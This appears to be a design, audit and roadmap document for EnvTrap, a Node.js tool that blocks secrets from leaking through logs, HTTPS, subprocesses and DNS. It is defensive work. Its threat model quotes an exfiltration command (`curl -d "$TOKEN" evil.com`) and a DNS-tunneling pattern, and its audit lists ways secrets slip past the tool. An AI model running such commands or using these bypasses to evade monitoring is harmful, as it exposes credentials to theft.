# EnvTrap: Full System Architecture, Comprehensive Analysis, and Implementation Guide

## 1. Executive Overview

EnvTrap is a zero-configuration runtime security guardrail for Node.js 18+ environments. It operates as an execution supervisor that monitors, sanitizes, and gates all egress channels through which credentials, API keys, and sensitive environment variables might leak.

### The Problem It Solves
1. **Accidental Developer & Framework Logging**:
   - `console.log(config)` or `console.error(err)` writing database connection strings, JWTs, or auth headers directly into terminal output, local log files, Datadog, CloudWatch, or Sentry.
2. **Supply Chain Attacks (Malicious npm Packages)**:
   - Malicious dependencies or compromised transitive packages accessing `process.env` and attempting silent exfiltration via:
     - Outbound HTTPS `POST` requests to command-and-control (C2) servers.
     - Spawning hidden system processes (e.g. `curl -d "$TOKEN" evil.com` or `sh -c`).
     - Covert DNS queries (encoding tokens inside subdomain queries like `<secret>.evil.com`).

EnvTrap operates without requiring modifications to the monitored application codebase, wrapping the target process via:
```bash
envtrap run [options] node app.js
```

---

## 2. Current Architecture: What EnvTrap Does Today

EnvTrap operates across five distinct layers: Configuration, Secret Ingestion & Fingerprinting, Supervisor Lifecycle, MITM Proxy Interception, and Runtime Monkeypatching Hooks.

```
+-----------------------------------------------------------------------------------+
|                                Parent CLI Process                                 |
|                                                                                   |
|  1. Configuration Loader (envtrap.json + CLI Flags)                               |
|  2. Secret Ingestion (DotEnvSecretSource + Ambient EnvSecretSource)               |
|  3. Secret Fingerprinting & Entropy Gate (looksLikeSecret)                        |
|  4. Local Root Certificate Authority & Loopback MITM Proxy (MitmServer)           |
|  5. Stdio Interception & Protocol Parser (StdioHandler + HookMessageParser)       |
+------------------------------------------+----------------------------------------+
                                           |
                   Spawns with NODE_OPTIONS, HTTP_PROXY, NODE_EXTRA_CA_CERTS
                                           v
+-----------------------------------------------------------------------------------+
|                                Child User Process                                 |
|                                                                                   |
|  ESM Loader Hooks (--import hooks.mjs)                                            |
|    - resolve() & load() -> injects virtual 'envtrap:child_process' & 'envtrap:dns'|
|  CJS Require Hooks                                                                |
|    - Monkeypatches Module.prototype.require for 'child_process' and 'dns'         |
|  Direct Interceptions:                                                            |
|    - process.stdout.write & process.stderr.write (Path-exclusion pre-redaction)   |
|    - node:child_process (spawn, exec, fork env inspection)                         |
|    - node:dns (Direct token substring search + Shannon entropy label scoring)     |
|    - process.env Proxy (MessageChannel secret sync on runtime mutations)          |
+------------------------------------------+----------------------------------------+
                                           | Outbound HTTPS Requests
                                           v
+-----------------------------------------------------------------------------------+
|                       Loopback MITM Proxy (Port 0)                                |
|                                                                                   |
|  1. Intercepts HTTP CONNECT tunneling requests                                    |
|  2. Dynamically generates & signs leaf domain certificates via in-memory CA       |
|  3. Terminates TLS with client application, decrypts traffic                      |
|  4. Inspects HTTP method, path, headers, query parameters, and payload body       |
|  5. Establishes upstream TLS socket; severs connection on secret detection        |
+-----------------------------------------------------------------------------------+
```

---

## 3. Channel-by-Channel Technical Breakdown

### Channel 1: Terminal & Log Streams (`stdout` and `stderr`)
- **Objective**: Ensure plaintext secrets are never written to standard output or standard error streams.
- **Current Mechanism**:
  - **Child Process**: Wraps `process.stdout.write` and `process.stderr.write` in `src/hooks/hooks.mjs`. If the caller path matches `exclusions.paths`, it executes `preRedact()` to replace secrets with `[REDACTED: PATH_EXCLUDED]`.
  - **Parent Process**: `StdioHandler` receives raw child chunks. It splits stderr by lines and checks for IPC alert signals via `HookMessageParser`. For general output, it scans using `Scanner.scan(chunk, 'stdout')`. If clean, it still executes `OutputRedactor.redact(chunk)`, converting detected secret substrings into irreversible SHA-256 placeholders: `[REDACTED: SHA256:a1b2c3d4]`.
  - **Actions Supported**: `block` (terminates child process immediately), `warn` (redacts content and logs alert), `off` (passthrough).

### Channel 2: Outbound Network Interception (`network`)
- **Objective**: Prevent secrets from leaving the server over HTTP/HTTPS.
- **Current Mechanism**:
  - `ChildEnvBuilder` exports `HTTP_PROXY`, `HTTPS_PROXY`, and `NODE_EXTRA_CA_CERTS` pointing to the local proxy and generated root CA.
  - `MitmServer` listens on an ephemeral loopback port (`127.0.0.1:0`).
  - When an outbound HTTPS connection is initiated (e.g. via Axios or `node:https`), the client issues an `HTTP CONNECT <host>:443` request to the proxy.
  - `ConnectHandler` delegates to `CertificateAuthority` to generate an X.509 domain certificate signed by the in-memory root CA.
  - `TlsInterceptor` decrypts incoming client chunks and checks for secret substrings. If a secret is detected:
    - If `block`: Instantly destroys both client and upstream sockets.
    - If `warn`: Logs a warning detailing the destination host, method, URL, and redacted header/body snippets using `HttpParser.formatNetworkContext()`.

### Channel 3: Subprocess Execution Guard (`child_process`)
- **Objective**: Prevent secrets from being passed to external shell commands or untrusted binaries.
- **Current Mechanism**:
  - `src/hooks/virtual/child-process.mjs` (ESM) and `wrapChildProcess` in `src/hooks/hooks.mjs` (CJS) intercept `spawn`, `spawnSync`, `exec`, `execSync`, `execFile`, `execFileSync`, and `fork`.
  - Audits `options.env` against `secretsMap`.
  - If a secret key-value match is found:
    - In `block` mode: Throws an exception or emits an error, preventing process creation.
    - In `warn` mode: Writes an IPC notification `[envtrap] Child process leak: secret "<name>" passed to: <command>` to stderr for the parent supervisor to log.

### Channel 4: DNS Exfiltration & Tunneling Defense (`dns`)
- **Objective**: Block attackers who bypass network proxies by encoding stolen credentials inside DNS resolution queries.
- **Current Mechanism**:
  - Intercepts all methods of `node:dns` (`lookup`, `resolve`, `resolve4`, `resolve6`, `resolveTxt`, etc.) and `dns.promises.*`.
  - **Direct Match**: Tests whether the queried hostname contains any tracked secret value. If matched, resolution is aborted with `Error: DNS resolution blocked by envtrap`.
  - **High-Entropy Label Analysis**: Splits the queried domain by dots into individual labels. For every label >= 12 characters, computes Shannon entropy:
    $$H = -\sum_{i=1}^{n} p(x_i) \log_2 p(x_i)$$
    If $H \ge 3.5$, flags a `dns_warning` for potential Base64/Hex DNS tunneling.

---

## 4. Comprehensive Audit: Current Bottlenecks, Pitfalls, and Blind Spots

An exhaustive audit of the source code revealed critical bottlenecks and security bypasses across four categories:

### Category A: Critical Performance Bottlenecks & Event Loop Freezes
1. **Unconditional `new Error().stack` on Every `stdout`/`stderr` Write**:
   - `src/hooks/hooks.mjs` lines 204–216 invokes `getCallerFile()` on every stdout/stderr write, generating a V8 stack trace even when path exclusions are empty (`[]`). This drops logging throughput by 80%–95%.
2. **Synchronous 2048-bit RSA Key Generation**:
   - `CertificateAuthority.ts` runs `generateKeyPairSync('rsa', 2048)` for every newly visited domain on the main thread, freezing the event loop for 25ms–120ms per new domain.
3. **Pure JavaScript Cryptography (`node-forge`)**:
   - Certificate generation and signing are performed in pure JavaScript using `node-forge`, which is up to 50x slower than Node's native C++ OpenSSL engine.
4. **Repeated `tls.createSecureContext` in `SNICallback`**:
   - `ConnectHandler.ts` compiles OpenSSL contexts from PEM strings dynamically on every single connection rather than caching the compiled `SecureContext`.
5. **Linear $O(N \times M)$ String Scanning with Redundant Entropy Calculations**:
   - `SecretMatcher.ts` loops through all secrets on every chunk, re-evaluating Shannon entropy dynamically inside `isCandidate()`.
6. **Redundant Redaction on Clean Output**:
   - `StdioHandler.ts` executes a full redaction pass across all secrets even when `scanner.scan` confirmed that no secrets exist in the chunk.
7. **Duplicate Full-Stream Scanning in Proxy**:
   - `TlsInterceptor.ts` buffers all chunks up to 1MB and executes a secondary scan via `Buffer.concat` on socket close, doubling CPU and RAM usage.
8. **Missing Stream Backpressure**:
   - `UpstreamConnector.ts` and `StdioHandler.ts` ignore the return value of `socket.write()`, leading to unbounded memory buffer accumulation and out-of-memory crashes on large transfers.
9. **Unbounded Memory Growth in Caches**:
   - Neither `DedupCache` nor `domainCertCache` implement LRU capacity limits or TTL eviction.

### Category B: Security Blind Spots & Detection Bypasses
1. **Default `process.env` Inheritance in `child_process`**:
   - Omitting `options.env` in `spawn('bash')` causes Node.js to inherit `process.env` by default. EnvTrap currently checks `if (options?.env)`, completely bypassing unscoped subprocesses.
2. **Uninspected CLI Arguments & Shell Strings**:
   - Passing secrets via flags (e.g. `exec('curl -H "Authorization: Bearer ' + token + '" ...')`) escapes detection because only environment variables are checked.
3. **Native `fetch` (undici) and Raw TCP/Database Proxy Bypass**:
   - Node 18+ `globalThis.fetch` ignores `HTTP_PROXY` by default. Database drivers (`pg`, `mysql2`, `ioredis`, `mongodb`, Kafka) use raw TCP connections on non-HTTP ports and bypass the MITM proxy completely.
4. **Secret Encoding Blind Spots**:
   - Substring matching fails against Base64 (HTTP Basic auth, JWTs), URL-encoded query parameters (`?k=sk_live%2Babc%3D`), JSON escapes (`\"`), and Hex strings.
5. **Streaming Chunk Race in TLS Proxy**:
   - Chunk 1 is flushed upstream before Chunk 2 (e.g. POST body) is scanned. If a secret spans chunk boundaries or is in the body, Chunk 1 has already left the machine over the wire.
6. **Explicit `.env` Secrets Discarded by Heuristics**:
   - Passwords with entropy < 3.5 or length < 12 (e.g. `DB_PASSWORD=secret123`) declared explicitly in `.env` are discarded by `looksLikeSecret()`.
7. **Unmonitored Worker Threads**:
   - Hooks check `if (isMainThread)`. Threads spawned via `worker_threads` (Piscina, BullMQ) skip all runtime interception.

### Category C: Operating System & Multi-Tenant Hazards
1. **Plaintext Secrets Exposed in Environment Block**:
   - Serializing all secrets into `process.env.__ENVTRAP_SECRETS_MAP__` allows any process under the same UID to read them via `/proc/$PID/environ` and gives all third-party npm packages single-property access to all credentials.
2. **Windows 32KB Environment Block Overflow**:
   - Storing large `.env` files or private keys in `__ENVTRAP_SECRETS_MAP__` exceeds Windows' 32,767-character environment block limit, causing `child_process.spawn` to crash with `EINVAL`.
3. **Predictable Static Path in `/tmp` for Root CA**:
   - Static path `/tmp/envtrap-ca.crt` causes file permission collisions and symlink attack risks on multi-user systems.

### Category D: Operational Noise & Enterprise Gaps
1. **Cloud Subdomain False-Positive DNS Warnings**:
   - Legitimate high-entropy subdomains (CloudFront, AWS API Gateway, MongoDB Atlas) trigger constant false-positive warnings.
2. **No Support for Dynamic Secrets**:
   - Modern backends rotate credentials dynamically via Vault or AWS Secrets Manager. EnvTrap only supports static startup environment variables.
3. **Lack of Headless / Library Mode**:
   - Serverless (AWS Lambda) and Kubernetes containers cannot always use CLI process wrappers and need `-r envtrap/preload` or direct imports.

---

## 5. Complete Implementation Roadmap: What We Must Implement

This section lays out the concrete architecture and features required to transform EnvTrap into an enterprise-grade security tool.

### Phase 1: High-Performance Engine & Event Loop Optimization

#### 1.1 Fast Path for Stdio Logging
- In `src/hooks/hooks.mjs`:
  ```javascript
  const hasPathExclusions = pathExclusions.length > 0;
  process.stdout.write = function(chunk, encoding, callback) {
    if (!hasPathExclusions) return origStdout.apply(process.stdout, arguments);
    const caller = getCallerFile();
    if (caller && isPathExcluded(caller, pathExclusions)) {
      arguments[0] = preRedact(chunk, secretsMap);
    }
    return origStdout.apply(process.stdout, arguments);
  };
  ```
- Result: 10x–20x throughput recovery for high-frequency application logging.

#### 1.2 Aho-Corasick Multi-Pattern Search Automaton
- Replace linear $O(N \times M)$ array searches in `SecretMatcher.ts` with an **Aho-Corasick** finite state automaton.
- Construct the trie once at startup. Matches all $N$ secrets simultaneously in a single linear pass $O(M)$ over any stream chunk.

#### 1.3 Pre-computed Hashes and Redaction Tags
- Store pre-computed `[REDACTED: SHA256:<hash>]` tags directly on `Secret` objects at boot.
- Eliminate repeated calls to `crypto.createHash('sha256')` inside `OutputRedactor`, `extractContext`, and `formatNetworkContext`.

#### 1.4 Single Shared CA Keypair & Cached SecureContext
- In `CertificateAuthority.ts`: Generate an ECDSA (P-256) or RSA private key once at startup. Reuse this key across all dynamically issued leaf certificates, generating only X.509 metadata and signatures.
- In `ConnectHandler.ts`: Cache the compiled `tls.SecureContext` instance inside `domainCertCache` alongside domain PEM strings.

#### 1.5 Stream Backpressure Coordination
- In `UpstreamConnector.ts` and `StdioHandler.ts`:
  ```typescript
  if (!targetSocket.write(chunk)) {
    sourceSocket.pause();
    targetSocket.once('drain', () => sourceSocket.resume());
  }
  ```

---

### Phase 2: Security & Detection Hardening

#### 2.1 Subprocess Environment & Command Line Gating
- Update `src/hooks/virtual/child-process.mjs`:
  ```javascript
  const effectiveEnv = options?.env ?? process.env;
  checkEnv(effectiveEnv, command);
  scanArguments(command, args);
  ```
- Inspect both the command string and arguments array for secret tokens.

#### 2.2 Multi-Format Secret Encoding Indexing
- For each candidate secret, generate and index:
  1. Verbatim raw UTF-8 string
  2. Base64 encoded (standard and URL-safe)
  3. URL-encoded (`encodeURIComponent`)
  4. JSON-escaped string
  5. Hexadecimal string
- Feed all variants into the Aho-Corasick automaton so encoded tokens are detected in the same single-pass scan.

#### 2.3 Distinct Rules for Explicit `.env` vs Ambient Variables
- Secrets explicitly declared in `.env` or configuration must be tracked unconditionally.
- Shannon entropy ($H \ge 3.5$) and length ($\ge 12$) gates should apply strictly to ambient system variables (`process.env`) to filter out noise.

#### 2.4 Sliding Window Overlap in Network Interceptor
- Maintain an overlapping buffer window equal to the maximum secret length across incoming stream chunks to catch tokens split across TCP packet boundaries.
- Buffer initial request headers until the HTTP delimiter (`\r\n\r\n`) before releasing data to the upstream socket.

---

### Phase 3: Comprehensive Protocol & Network Coverage

#### 3.1 Native `fetch` (undici) Support
- In the runtime bootstrap hook, configure undici's global dispatcher:
  ```javascript
  import { setGlobalDispatcher, EnvHttpProxyAgent } from 'undici';
  setGlobalDispatcher(new EnvHttpProxyAgent());
  ```
  Ensures Node 18+ `globalThis.fetch` routes through the local MITM proxy.

#### 3.2 Raw TCP/TLS Database Driver Monitoring
- Hook `node:net` (`net.Socket.prototype.connect`) and `node:tls` (`tls.connect`) at runtime.
- For connections to database ports (5432, 6379, 27017, 9092), attach streaming scanners to outbound payload chunks before data hits the kernel socket.

#### 3.3 HTTP/2 Protocol Downgrade & WebSocket Support
- In the MITM proxy TLS handshake, decline HTTP/2 in ALPN negotiation to enforce transparent HTTP/1.1 fallback.
- For WebSockets, unmask 4-byte XOR client frames before string inspection.

#### 3.4 Cloud Subdomain Allowlisting in DNS Channel
- Maintain a built-in allowlist of trusted cloud provider suffixes (`.amazonaws.com`, `.cloudfront.net`, `.azure.com`, `.googleapis.com`, `.mongodb.net`).
- Skip high-entropy warning heuristics on matching domains while retaining direct secret match checks.

---

### Phase 4: Enterprise & Production Readiness

#### 4.1 Headless Preload & Library Mode
- Enable execution in Kubernetes, Docker, and AWS Lambda without external CLI wrappers:
  ```bash
  # Preload mode
  node -r envtrap/preload app.js

  # Programmatic import
  import 'envtrap/init';
  ```

#### 4.2 Dynamic Secrets Registration API
- Provide an in-process SDK to support cloud credential rotation (Vault, AWS Secrets Manager):
  ```typescript
  import { registerSecret, unregisterSecret } from 'envtrap';
  registerSecret('DATABASE_URL', newConnectionString);
  ```
- Dynamically updates the in-memory search automaton without restarting the process.

#### 4.3 Secure Secret IPC (Eliminating `__ENVTRAP_SECRETS_MAP__`)
- Replace plaintext environment serialization with an anonymous Unix domain socket, pipe, or temporary file descriptor unlinked immediately after reading.
- Eliminates `/proc/$PID/environ` exposure and avoids Windows 32KB environment block limits.

#### 4.4 Enterprise Telemetry & SIEM Exporters
- Add pluggable telemetry reporters to `envtrap.json`:
  ```json
  {
    "reporters": [
      { "type": "opentelemetry", "endpoint": "http://otel-collector:4318" },
      { "type": "webhook", "url": "https://siem.corp.internal/events" }
    ]
  }
  ```
- Stream structured JSON events with timestamps, severity, channel, and redacted context to central SecOps platforms.

---

## 6. Architecture Comparison Matrix

| Capability | Current EnvTrap | Enterprise Target |
| :--- | :--- | :--- |
| **String Search** | $O(N \times M)$ linear search | **Aho-Corasick** $O(M)$ multi-pattern automaton |
| **Secret Encodings** | Raw UTF-8 only | Raw, Base64, URL-encoded, Hex, JSON-escaped |
| **Stdio Logging Overhead** | High (captures stack trace per write) | Negligible (fast path bypass when no path exclusions) |
| **Child Process Env** | Only explicit `options.env` | Default `process.env` inheritance + CLI args |
| **Worker Threads** | Unmonitored (`isMainThread` only) | Coordinated monitoring across all worker threads |
| **Outbound HTTP Client** | Axios / `https.request` only | Axios, `https`, and native `fetch` (undici) |
| **Database Protocols** | Ignored (bypasses HTTP proxy) | Outbound TCP/TLS stream inspection for DB drivers |
| **TLS Key Generation** | Synchronous 2048-bit RSA per domain | Single shared ECDSA P-256 / RSA keypair |
| **TLS Context Caching** | Recompiled per connection | Cached `tls.SecureContext` per domain |
| **Stream Backpressure** | Ignored (unbounded buffer risk) | Strict `pause()` and `drain` coordination |
| **Inbound Response Scan** | UTF-8 scans all inbound binary/gzip | Gated / outbound egress focused only |
| **Memory Caching** | Unbounded Maps | Bounded LRU caches with TTL pruning |
| **DNS Defense** | Direct match + raw Shannon entropy | Cloud suffix bypass + multi-encoding pre-matching |
| **Runtime Secret Rotation** | Local `process.env` proxy | Programmatic API (`registerSecret`) + Cloud SDK hooks |
| **Deployment Modes** | CLI wrapper process only | CLI wrapper + Preload (`-r envtrap`) + Direct Import |
| **Telemetry & SIEM** | Local stderr + `.envtrap-report.json` | OpenTelemetry, Datadog, Splunk, Webhooks |
